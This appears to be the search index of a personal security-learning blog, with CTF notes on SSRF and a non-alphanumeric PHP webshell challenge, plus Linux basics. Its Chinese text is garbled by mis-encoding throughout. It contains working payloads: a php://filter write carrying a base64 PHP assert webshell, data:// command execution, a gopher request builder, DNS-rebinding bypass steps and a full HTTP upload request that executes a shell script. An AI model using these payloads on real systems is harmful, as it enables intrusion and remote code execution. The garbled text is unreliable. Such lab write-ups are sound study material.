[{"title":"æœ¬ç«™æŒ‡å—ï¼šå…³äºè¿™é‡Œçš„è®°å½•","path":"/2025/12/23/æœ¬ç«™æŒ‡å—/","content":"ğŸ‘‹ æ¬¢è¿æ¥åˆ°æˆ‘çš„ Blogå¾ˆé«˜å…´ä½ èƒ½è®¿é—®è¿™é‡Œã€‚å»ºç«‹è¿™ä¸ªåšå®¢çš„åˆè¡·ï¼Œæ˜¯ä¸ºäº†å¯¹è‡ªå·±æ¼«é•¿çš„ç½‘ç»œå®‰å…¨å­¦ä¹ ä¹‹è·¯åšä¸€ä¸ªç³»ç»Ÿçš„æ¢³ç†å’Œæ²‰æ·€ã€‚ è¿™é‡Œçš„å®šä½è¿™ä¸æ˜¯ä¸€ä¸ªéšæ„çŒæ°´çš„åœ°æ–¹ï¼Œæˆ‘ä¸»è¦ä¼šåœ¨è¿™é‡Œåˆ†äº«ä¸¤ç±»å†…å®¹ï¼š 1. ğŸ§© çŸ¥è¯†ç‚¹ç¢ç‰‡ (Knowledge Points)åœ¨å­¦ä¹  Web å®‰å…¨ã€å†…ç½‘æ¸—é€çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬æ€»ä¼šé‡åˆ°å„ç§å„æ ·ç»†ç¢ä½†å…³é”®çš„çŸ¥è¯†ç‚¹ï¼ˆæ¯”å¦‚æŸä¸ªç‰¹å®šçš„ Bypass æŠ€å·§ã€æŸä¸ªåè®®çš„ç‰¹æ®Šç”¨æ³•ï¼‰ã€‚æˆ‘ä¼šæŠŠè¿™äº›ç¢ç‰‡åŒ–çš„çŸ¥è¯†æ•´ç†æˆæ–‡æ¡£ï¼Œæ–¹ä¾¿éšæ—¶æŸ¥é˜…ï¼Œä¹Ÿå¸Œæœ›èƒ½å¸®åˆ°é‡åˆ°åŒæ ·é—®é¢˜çš„ä½ ã€‚ ä½ å¯ä»¥åœ¨èœå•çš„ æ–‡æ¡£ - [WebçŸ¥è¯†ç‚¹] ä¸­æ‰¾åˆ°å®ƒä»¬ã€‚ 2. ğŸ¯ é¶åœºå®æˆ˜ WP (WriteUp)â€œçº¸ä¸Šå¾—æ¥ç»ˆè§‰æµ…â€ã€‚é™¤äº†ç†è®ºï¼Œæˆ‘ä¼šè®°å½•æŒ‘æˆ˜å„ç§å¤§å‹ç»¼åˆé¶åœºï¼ˆå¦‚ VulnHubï¼ŒHackTheBox ç­‰ï¼‰çš„å®Œæ•´è¿‡ç¨‹ã€‚è¿™éƒ¨åˆ†å†…å®¹ä¼šé‡ç‚¹å¤ç›˜ï¼š æ€è·¯çš„å½¢æˆ é‡åˆ°çš„å‘ä¸æ’é”™ æœ€ç»ˆçš„åˆ©ç”¨é“¾æ¡ ä½ å¯ä»¥åœ¨èœå•çš„ æ–‡æ¡£ - [WP] ä¸­æ‰¾åˆ°å®ƒä»¬ã€‚ ğŸš€ å…³äºä½œè€…ä¸€åæ­£åœ¨è·¯ä¸Šçš„å®‰å…¨å­¦ä¹ è€…ã€‚å¦‚æœä½ å¯¹æœ¬ç«™çš„å†…å®¹æœ‰ç–‘é—®ï¼Œæˆ–è€…æƒ³äº¤æµæŠ€æœ¯ï¼Œæ¬¢è¿é€šè¿‡ ç¤¾äº¤ é‡Œçš„æ–¹å¼è”ç³»æˆ‘ã€‚ Stay Hungry, Stay Foolish. (æœ¬æ–‡ç½®é¡¶æ˜¾ç¤ºï¼Œä½œä¸ºæœ¬ç«™å†…å®¹çš„ç´¢å¼•è¯´æ˜)","tags":["è¯´æ˜","è®¡åˆ’"],"categories":["æ‚è°ˆ"]},{"title":"SSRF","path":"/wiki/WebçŸ¥è¯†ç‚¹/SSRF.html","content":"SSRF æ›´æ–°: 2025-10-30 16:42:25åŸæ–‡: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/clrqweba0dng1ltw"},{"title":"æ–‡æ¡£åº“","path":"/wiki/index.html","content":"WebçŸ¥è¯†ç‚¹ æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½• WP æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½• å†…ç½‘ æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½• ç¬”è®° æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½•"},{"title":"CRLF","path":"/wiki/WebçŸ¥è¯†ç‚¹/CRLF.html","content":"CRLF æ›´æ–°: 2025-10-30 16:58:04åŸæ–‡: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/qckli5cq72lf4vs5"},{"title":"WebçŸ¥è¯†ç‚¹","path":"/wiki/WebçŸ¥è¯†ç‚¹/index.html","content":"SQLæ³¨å…¥ æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½• xss æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½• xxeæ¼æ´ æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½• å·¥å…·æŒ‡å— æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½• å¸¸è§å¯†ç &è·¯å¾„ æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½• æ–‡ä»¶ä¸Šä¼  æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½• æ–‡ä»¶ä¸‹è½½ æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½• æ–‡ä»¶åŒ…å« æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½• é€»è¾‘è¶Šæƒ æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½• CORS ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ CRLF ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ CSRF ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ SSRF ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ æ¼æ´å‘ç° ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£"},{"title":"CSRF","path":"/wiki/WebçŸ¥è¯†ç‚¹/CSRF.html","content":"CSRF æ›´æ–°: 2025-10-30 16:42:10åŸæ–‡: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/sa9z2ctw8pzyp4lp"},{"title":"æ¼æ´å‘ç°","path":"/wiki/WebçŸ¥è¯†ç‚¹/æ¼æ´å‘ç°.html","content":""},{"title":"SSRF_å†…ç½‘è®¿é—®","path":"/wiki/WP/SSRF_å†…ç½‘è®¿é—®.html","content":"ä¼ªåè®® file://php://input # æ‰§è¡Œphpä»£ç php://filter # è¯»å–æºç  writeçš„è¯GETæäº¤?file=php://filter/wirte=convert.base64-decode/resource=2.phpPOSTæäº¤content=PD9waHAgYXNzZXJ0KCRfUE9TVFt4XSk7Pz4=zip:// #å‹ç¼©æ–‡ä»¶data:// #æ‰§è¡Œphpä»£ç  ?url=data://text/plain,?php system(ls);? gopheråè®® gopheråè®®ï¼ˆæ”»å‡»å†…ç½‘æœåŠ¡çš„ä¸‡é‡‘æ²¹ï¼‰ï¼šgopheræ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ã€‚å¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œå†æ„é€ æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­ä¸€ä¸ªæœ€å¼ºå¤§çš„åè®®(ä¿—ç§°ä¸‡èƒ½åè®®)ã€‚å¯ç”¨äºåå¼¹shell(å…·ä½“çœ‹è„šæœ¬æ–‡ä»¶)from urllib.parse import quotepayload = \\POST /flag.php HTTP/1.1Host: 127.0.0.1:80Content-Type: application/x-www-form-urlencodedContent-Length: 36key=260a97ac2ef360dec36238c7d6c49c25payload = quote(payload)payload = payload.replace(%0A, %0D%0A)payload = fgopher://127.0.0.1:80/_quote(payload)print(payload)URL: gopher://host:port/gopher-path_åæ¥TCPæ•°æ®æµ---ä¹Ÿå°±æ˜¯æ„é€ çš„åŒ…ï¼ˆè¦è¿›è¡Œurlç¼–ç ï¼Œå…·ä½“å‡ æ¬¡çœ‹æƒ…å†µï¼‰(!!!ä¸€å®šè¦æœ‰ä¸‹æ–œæ )gopheråè®®ä¸­çš„postè¯·æ±‚éœ€è¦åŒ…å«å‡ ä¸ªå¿…è¦çš„å­—æ®µHOSTï¼ŒContent-Length,Content-Type POSTè¯·æ±‚ç¼–ç å‡ºæ¥çš„æ¢è¡Œæ˜¯%0Aï¼Œå°±éœ€è¦æŠŠ%0Aæ”¹æˆ%0D%0Agopher://127.0.0.1:80/_%250D%250APOST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D260a97ac2ef360dec36238c7d6c49c25%250D%250A fastcgiåè®®ï¼ˆè¿›ç¨‹é—´é€šä¿¡ï¼‰ CGIåè®® # è®¿é—®url -- æµè§ˆå™¨ç”ŸæˆHTTPè¯·æ±‚æŠ¥æ–‡ -- web serverè§£æè¯·æ±‚ï¼ˆä¾‹å¦‚nginxï¼‰web server æ˜¯å†…å®¹çš„åˆ†å‘è€…å½“è®¿é—®é™æ€é¡µé¢æ—¶ï¼Œweb server ä¼šç›´æ¥è¿”å›èµ„æºï¼Œä¾‹å¦‚index.htmlå½“è®¿é—®åŠ¨æ€é¡µé¢æ—¶ï¼Œweb server ä¼šè°ƒç”¨è§£æå™¨ï¼Œä¾‹å¦‚index.php # -- è®¿é—®CGI# -- CGIåˆå§‹åŒ–ç¯å¢ƒï¼ŒåŠ è½½é…ç½®ï¼Œå¤„ç†è¯·æ±‚ï¼Œè¿”å›èµ„æºï¼Œç»“æŸè¿›ç¨‹ ï¼ˆæ¯æ¬¡å¤„ç†è¯·æ±‚åéƒ½ä¼šé”€æ¯è¿›ç¨‹ï¼Œæµªè´¹èµ„æºï¼‰FASTCGI # è®¿é—®url -- æµè§ˆå™¨ç”ŸæˆHTTPè¯·æ±‚æŠ¥æ–‡ -- web serverè§£æè¯·æ±‚ï¼ˆä¾‹å¦‚nginxï¼‰å½“è®¿é—®index.phpæ—¶ï¼Œweb server ä¼šæŠŠHTTPè¯·æ±‚è½¬æ¢ä¸ºFastCGIè¯·æ±‚# -- è½¬æ¢ä¸ºFastCGIåè®®æ ¼å¼å¹¶å‘é€ç»™è§£æå™¨ï¼Œè¿™é‡Œä»¥phpä¸ºä¾‹# -- å‘é€è‡³php-fpm process managerphp-fpmæ¥æ”¶åˆ°è¯·æ±‚åï¼ŒæŠŠè¯·æ±‚åˆ†é…ç»™ä¸€ä¸ªworkerï¼Œworkerå°±æ˜¯ä¸€ä¸ªè§£ææœåŠ¡çš„è¿›ç¨‹ï¼ˆä¸€ç›´è¿è¡Œï¼‰ï¼Œworkeræ ¹æ®è¯·æ±‚ä¿¡æ¯ï¼Œè§£æphpï¼Œè¿”å›é¡µé¢ä¾‹å¦‚ï¼Œæ‹›æ–°å¹³å°è¿è¡Œäº†15ä¸ªworkerï¼Œï¼ˆä¸è€ƒè™‘nginxå¤„ç†æ—¶é—´ï¼‰åŒæ—¶å¯ä»¥å¤„ç†15ä¸ªè¯·æ±‚# -- php-fpmè§£æå¹¶å“åº” redis åè®®ï¼Œå’Œä¸Šé¢ä¸€æ ·ï¼Œå¯ä»¥ç›´æ¥ç”¨gopherus çš„redisæ¨¡å— ï¼Œä½¿ç”¨é»˜è®¤çš„ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆshell.php cmdä¸ºå¯†ç  SSRF Bypass url Bypass 1.ä½¿ç”¨HTTPåŸºç¡€è®¤è¯ HTTP åŸºæœ¬èº«ä»½è®¤è¯å…è®¸ Web æµè§ˆå™¨æˆ–å…¶ä»–å®¢æˆ·ç«¯ç¨‹åºåœ¨è¯·æ±‚æ—¶æä¾›ç”¨æˆ·åå’Œå£ä»¤å½¢å¼çš„èº«ä»½å‡­è¯çš„ä¸€ç§ç™»å½•éªŒè¯æ–¹å¼ã€‚ä¹Ÿå°±æ˜¯ï¼šhttp://www.xxx.com@www.yyy.comå½¢å¼ç®€å•æ¥è¯´ï¼Œå°±æ˜¯http://www.baidu.com@192.168.0.1/ä¸http://192.168.0.1è¯·æ±‚çš„éƒ½æ˜¯192.168.0.1çš„å†…å®¹ã€‚è¿™é‡Œçš„@æ˜¯ä¸»åŸŸåè§£æï¼Œå³@ç¬¦å·åé¢ç›´æ¥è·ŸåŸŸåï¼Œ@ç¬¦å·å‰é¢çš„å†…å®¹ä¼šè¢«è§†ä¸ºç”¨æˆ·åï¼Œç›¸å½“äºä»¥http://baidu.comçš„ç”¨æˆ·åè®¿é—®192.168.0.1/flag.phpï¼Œè‡³äºç”¨æˆ·åæ˜¯å•¥ä¸é‡è¦ï¼Œå…³é”®æ˜¯@åé¢çš„æ‰æ˜¯è§£æçš„åœ°å€ï¼2.ä½¿ç”¨nip.io .nip.io æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„åŸŸååç¼€ï¼Œå®ƒæä¾›äº†ä¸€ç§å…è´¹ä¸”ç®€ä¾¿çš„æ–¹å¼ï¼Œå¯ä»¥å°†ç‰¹å®šæ ¼å¼çš„åŸŸåè§£æä¸ºå¯¹åº”çš„IPåœ°å€ï¼Œå¯ä»¥ä½œä¸ºåº”ç”¨è·¯ç”±çš„è§£ææœåŠ¡ã€‚è¿™çœå»äº†é…ç½®æœ¬åœ°hostsæ–‡ä»¶çš„æ­¥éª¤ã€‚ä¾‹å¦‚ï¼Œå½“è®¿é—®http://anything-IP Address.nip.ioæ—¶ï¼Œå®ƒå°†è§£æåˆ°å¯¹åº”çš„IPåœ°å€IP Address?url=http://notfound.ctfhub.com.127.0.0.1.nip.io/flag.php æ•°å­—IP Bypass 1.ipè½¬int 2.åå…­è¿›åˆ¶3.å…«è¿›åˆ¶4.localhostã€http://0/ç­‰5.ipv6ç»•è¿‡ 302è·³è½¬ Bypass éœ€è¦vps æš‚æ—¶è·³è¿‡ DNSé‡è§£æ å¯¹äºç”¨æˆ·è¯·æ±‚çš„URLå‚æ•°ï¼Œé¦–å…ˆæœåŠ¡å™¨ç«¯ä¼šå¯¹å…¶è¿›è¡ŒDNSè§£æï¼Œç„¶åå¯¹äºDNSæœåŠ¡å™¨è¿”å›çš„IPåœ°å€è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœåœ¨é»‘åå•ä¸­ï¼Œå°±passè¿‡æ»¤æ‰.ä½†æ˜¯åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œç¬¬ä¸€æ¬¡å»è¯·æ±‚DNSæœåŠ¡è¿›è¡ŒåŸŸåè§£æåˆ°ç¬¬äºŒæ¬¡æœåŠ¡ç«¯å»è¯·æ±‚URLä¹‹é—´å­˜åœ¨ä¸€ä¸ªæ—¶é—´å·®ï¼Œåˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡ŒDNS é‡ç»‘å®šæ”»å‡»ï¼Œåˆ©ç”¨DNS RebindingæŠ€æœ¯ï¼Œåœ¨ç¬¬ä¸€æ¬¡æ ¡éªŒIPçš„æ—¶å€™è¿”å›ä¸€ä¸ªåˆæ³•çš„IPï¼Œåœ¨çœŸå®å‘èµ·è¯·æ±‚çš„æ—¶å€™ï¼Œè¿”å›æˆ‘ä»¬çœŸæ­£æƒ³è¦è®¿é—®çš„å†…ç½‘IPå³å¯è¦å®ŒæˆDNSé‡ç»‘å®šæ”»å‡»ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªåŸŸåï¼Œå¹¶ä¸”å°†è¿™ä¸ªåŸŸåçš„è§£ææŒ‡å®šåˆ°æˆ‘ä»¬è‡ªå·±çš„DNS Serverï¼Œåœ¨æˆ‘ä»¬çš„å¯æ§çš„DNS Serverä¸Šç¼–å†™è§£ææœåŠ¡ï¼Œè®¾ç½®TTLæ—¶é—´ä¸º0ï¼Œè¿™æ˜¯ä¸ºäº†é˜²æ­¢æœ‰DNSæœåŠ¡å™¨å¯¹è§£æç»“æœè¿›è¡Œç¼“å­˜ã€‚è¿™æ ·å°±å¯ä»¥è¿›è¡Œæ”»å‡»äº†ï¼Œå®Œæ•´çš„æ”»å‡»æµç¨‹ä¸ºï¼š1ã€æœåŠ¡å™¨ç«¯è·å¾—URLå‚æ•°ï¼Œè¿›è¡Œç¬¬ä¸€æ¬¡DNSè§£æï¼Œè·å¾—äº†ä¸€ä¸ªéå†…ç½‘çš„IP2ã€å¯¹äºè·å¾—çš„IPè¿›è¡Œåˆ¤æ–­ï¼Œå‘ç°ä¸ºéé»‘åå•IPï¼Œåˆ™é€šè¿‡éªŒè¯3ã€æœåŠ¡å™¨ç«¯å¯¹äºURLè¿›è¡Œè®¿é—®ï¼Œç”±äºDNSæœåŠ¡å™¨è®¾ç½®çš„TTLä¸º0ï¼Œæ‰€ä»¥å†æ¬¡è¿›è¡ŒDNSè§£æï¼Œè¿™ä¸€æ¬¡DNSæœåŠ¡å™¨è¿”å›çš„æ˜¯å†…ç½‘åœ°å€4ã€ç”±äºå·²ç»ç»•è¿‡éªŒè¯ï¼Œæ‰€ä»¥æœåŠ¡å™¨ç«¯è¿”å›è®¿é—®å†…ç½‘èµ„æºçš„ç»“æœæ€»ç»“æ¥è¯´ï¼šç”±äºæˆ‘ä»¬æ— æ³•åœ¨ç¨‹åºè¿è¡Œæ—¶ä»¥æ¯«ç§’ä¸ºå•ä½æ‰‹åŠ¨æ›´æ”¹DNSè®°å½•ï¼Œæ‰€ä»¥è¦æƒ³å®ç°DNSé‡ç»‘å®šæ”»å‡»ï¼Œå°±å¿…é¡»é…ç½®ä¸€ä¸ªè‡ªå®šä¹‰çš„æ¶æ„DNSæœåŠ¡å™¨ï¼Œå¹¶è®¾å®šå¥½æŒ‡å®šåŸŸåçš„è§£æIPï¼Œå†å°†TTLè®¾ç½®ä¸º0ï¼Œä½¿å…¶è§£ææ—¶åœ¨éæ³•å†…ç½‘IPä¸åˆæ³•å…¶ä»–IPé—´åå¤æ¨ªè·³ã€‚ç”¨ä¸‹é¢è¿™ä¸ªç½‘ç«™å¯ä»¥è¿›è¡ŒDNSé‡ç»‘å®šrbndr.us dns rebinding service (cmpxchg8b.com)ç»‘å®šçš„ä¸¤ä¸ªipä¸­ä¿è¯æœ‰ä¸€ä¸ªæ˜¯127.0.0.1å³å¯ï¼Œæˆ‘è¿™é‡Œå’Œ192.168.0.1ç»‘å®šäº†ï¼Œç»“æœä¸º7f000001.c0a80001.rbndr.uså› æ­¤æˆ‘ä»¬çš„url=7f000001.c0a80001.rbndr.us/flag.php ï¼Œæ³¨æ„è¿™ä¸ªåŸŸåç›¸å½“äºç»‘å®šäº†ä¸¤ä¸ªipåœ°å€ï¼ˆåŒä¸€æ—¶åˆ»åªå¯¹åº”ä¸€ä¸ªï¼‰ï¼Œç”±äºæ— æ³•ç¡®å®šè¿›è¡Œdnsæ ¡éªŒæ—¶çš„ipæ˜¯å¦ä¸º127.0.0.1ï¼Œå¯èƒ½ä¸€æ¬¡è¯·æ±‚ä¸æˆåŠŸï¼Œå¤šåˆ·æ–°å‡ æ¬¡å³å¯ã€‚"},{"title":"æ— å­—æ¯æ•°å­—webshell","path":"/wiki/WP/æ— å­—æ¯æ•°å­—webshell.html","content":"æ‰“å¼€é¢˜ç›®åªæœ‰ä¸€æ®µwhere is the flag?å³é”®æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°æç¤º!-- hint:?cmd= --ï¼ŒåŠ ä¸Šè¯·æ±‚å‚æ•°åé‡æ–°è®¿é—®å‡ºç°ä»£ç ã€‚å…³é”®ç‚¹æ˜¯ä¸¤ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œåˆ†åˆ«ä¸ºpreg_match(/[A-Za-oq-z0-9$]+/,$cmd)å’Œpreg_match(/\\~|\\!|\\@|\\#|\\%|\\^|\\|\\*|\\(|\\)|\\ï¼ˆ|\\ï¼‰|\\-|\\_|\\{|\\}|\\[|\\]|\\|\\|\\:|\\,/,$cmd)ï¼Œè¿™ä¸¤ä¸ªæ­£åˆ™å°†é™¤äº†på­—æ¯ä»¥å¤–çš„æ‰€æœ‰å­—æ¯æ•°å­—å’Œä¸€äº›ç‰¹æ®Šç¬¦å·è¿›è¡Œäº†è¿‡æ»¤ã€‚ PHPä¸Šä¼ æœºåˆ¶ï¼šåœ¨phpä¸­ï¼Œä½¿ç”¨Content-Type: multipart/form-data;ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œä¼šå°†å®ƒä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶ä¸­ï¼Œåœ¨phpçš„é…ç½®ä¸­upload_tmp_dirå‚æ•°ä¸ºä¿å­˜ä¸´æ—¶æ–‡ä»¶çš„è·¯ç»ï¼Œlinuxä¸‹é¢é»˜è®¤ä¸º/tmpã€‚ä¹Ÿå°±æ˜¯è¯´åªè¦phpæ¥æ”¶ä¸Šä¼ è¯·æ±‚ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ã€‚å¦‚æœå…·æœ‰ä¸Šä¼ åŠŸèƒ½ï¼Œé‚£ä¹ˆä¼šå°†è¿™ä¸ªæ–‡ä»¶æ‹·èµ°å‚¨å­˜ã€‚æ— è®ºå¦‚ä½•åœ¨æ‰§è¡Œç»“æŸåè¿™ä¸ªæ–‡ä»¶ä¼šè¢«åˆ é™¤ã€‚å¹¶ä¸”phpæ¯æ¬¡åˆ›å»ºçš„ä¸´æ—¶æ–‡ä»¶åéƒ½æœ‰å›ºå®šçš„æ ¼å¼ï¼Œä¸ºphpXXXX.tmpï¼ˆWindowsä¸­ï¼‰ã€php**.tmpï¼ˆLinuxä¸­ï¼‰ PHPä¸­åå¼•å·ä½œç”¨ï¼šåœ¨phpé‡Œé¢åå¼•å·é‡Œé¢çš„å†…å®¹ä¼šè¢«å½“åšshellå‘½ä»¤è¢«æ‰§è¡Œã€‚ä¾‹å¦‚?php echo`whoami`; ? ä¼šç›´æ¥å½“ä½œå‘½ä»¤æ‰§è¡Œ.å·ç›¸å½“äºsourceå‘½ä»¤ï¼Œè¿™ä¸ªå‘½ä»¤å¯ä»¥ç›´æ¥æŠŠæ–‡ä»¶å†…å®¹å½“ä½œå‘½ä»¤æ‰§è¡Œï¼Œç›¸å½“äºæŠŠæ–‡ä»¶ç›´æ¥å½“ä½œshellè„šæœ¬æ‰§è¡Œ?=ç›¸å½“äº?php ehcoçš„ç®€å†™ç‰ˆ?ç›¸å½“äºå­—ç¬¦çš„é€šé…ç¬¦ payload: ?cmd??.+/??p/p?p??????; ?ï¼šé—­åˆå‰é¢çš„?phpå‘½ä»¤?=ï¼šç›¸å½“äº?php echoåå¼•å·:æ‰§è¡Œå‘½ä»¤.ç›¸å½“äºsourceå‘½ä»¤+ï¼šç›¸å½“äºç©ºæ ¼?ï¼šæ–‡å­—é€šé…ç¬¦ï¼Œè´Ÿè´£æ‰§è¡Œä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ æ„é€ æ•°æ®åŒ… POST /?cmd=??=`.+/??p/p?p??????`; HTTP/1.1Host: bcb5cac6-1033-4f9b-89a0-e618dcbfc700.challenge.ctf.showUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888Content-Length: 230-----------------------------10242300956292313528205888Content-Disposition: form-data; name=fileUpload; filename=1.txtContent-Type: text/plain#! /bin/bashcat /flag.txt-----------------------------10242300956292313528205888-- boundary=:boundaryå®šä¹‰è¾¹ç•Œç¬¦ #! /bin/bashæŒ‡å®šä¸Šä¼ å†…å®¹æ˜¯bashè„šæœ¬ï¼Œ cat ../../../flag.txtæ‰§è¡Œå‘½ä»¤å¾—åˆ°flagï¼ˆåœ¨è¿™ä¹‹å‰å…ˆé€æ¬¡æ‰§è¡Œlså‘½ä»¤ï¼Œä¸æ–­è¿”å›ä¸Šä¸€å±‚ï¼ŒæŸ¥æ‰¾flag.txtçš„ä½ç½®ï¼‰ https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html"},{"title":"WP","path":"/wiki/WP/index.html","content":"Linuxææƒ æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½• PHPç‰¹æ€§ æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½• REC æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½• root-me æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½• sqlæ³¨å…¥ æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½• Windowsææƒ æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½• ååºåˆ—åŒ– æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½• æ–‡ä»¶ä¸Šä¼  æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½• æ–‡ä»¶åŒ…å« æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½• é‚å›¦æ¬¢é–å‘­æƒˆ æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½• SSRF_å†…ç½‘è®¿é—® ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ æ— å­—æ¯æ•°å­—webshell ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£"},{"title":"ç¬”è®°","path":"/wiki/ç¬”è®°/index.html","content":"JSæ¸—é€ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ linuxå­¦ä¹  ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ ç½‘ç»œ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ ç½‘ç»œå®‰å…¨ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£"},{"title":"linuxå­¦ä¹ ","path":"/wiki/ç¬”è®°/linuxå­¦ä¹ .html","content":"stdin stdout stderrå¯¹åº”æ–‡ä»¶æ ‡è¯†ç¬¦ï¼š0 1 2 å¦‚æœæˆ‘ä»¬æƒ³å°† STDOUT å’Œ STDERR é‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨font style=color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);/fontã€‚è¿™ä¸ªâ€œâ€ä»£è¡¨ FD 1 å’Œ FD 2 è¡¨ç¤º 1å’Œ2 é‡å®šå‘ è¿½åŠ  è¦†ç›– | ç®¡é“ç¬¦ rm -r r é€’å½’åˆ›å»ºæ–‡ä»¶ touchuniq å»é™¤ç›¸é‚»é‡å¤è¡Œ æƒ³è¦å»é™¤æ•´ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥å…ˆsortï¼Œç„¶åå»é™¤ cat animals | tee unsorted.txt | sort | uniq sorted.txt teeçš„ä½œç”¨æ˜¯å°†å¦ä¸€ä¸ªå‘½ä»¤è¾“å‡ºçš„ STDIN ä¼ é€’è¿‡å»ï¼ŒåŒæ—¶å°†å‰¯æœ¬å†™å…¥æ–‡ä»¶ ç”¨æˆ·æƒé™ uid(ç”¨æˆ·æ ‡è¯†ç¬¦) root 0 æ™®é€š 1-501 useradd -u æŒ‡å®šuid -d æŒ‡å®šç›®å½• passwd -d æ¸…ç©ºå¯†ç  -l é”å®šè´¦æˆ· -u è§£é” -S æ˜¯å¦é”å®š usermod -l æ›´æ”¹åå­— -L é”å®š -U è§£é” userdel -r æ–‡ä»¶æƒé™orç›®å½•æƒé™ r w x chmod -Ré€’å½’ä¿®æ”¹æƒé™ umask è®¾å®šæ–‡ä»¶åˆå§‹æƒé™ chown å±ä¸» æ–‡ä»¶æˆ–ç›®å½• setä½ s ç²˜æ»ä½ t å…±äº«æ–‡ä»¶ç”¨ chattr i å…¨é” a ä¿®æ”¹é” +ï¼Œ-ï¼Œç”¨æ³•ç›¸åŒ ç½‘ç»œroute route add -net æˆ‘è¦å»å“ª gw ä¸‹ä¸€è·³åœ°å€ route add default gw ç½‘å…³ ä¿®æ”¹ç½‘ç»œ vim etcsysconfignetwork-scriptsifcfg-xxx BOOTPROTOdhcp -static onbootyes ipaddr netmask gateway dns1 dns2 æŸ¥çœ‹dns cat 